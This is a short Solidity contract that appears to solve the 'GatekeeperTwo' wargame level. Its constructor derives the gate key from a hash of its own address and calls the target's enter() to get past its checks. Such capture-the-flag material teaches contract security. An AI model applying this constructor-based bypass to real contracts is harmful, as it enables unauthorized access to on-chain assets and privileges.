// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(GatekeeperTwo gatekeeper){
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        gatekeeper.enter(gateKey);
    }
}
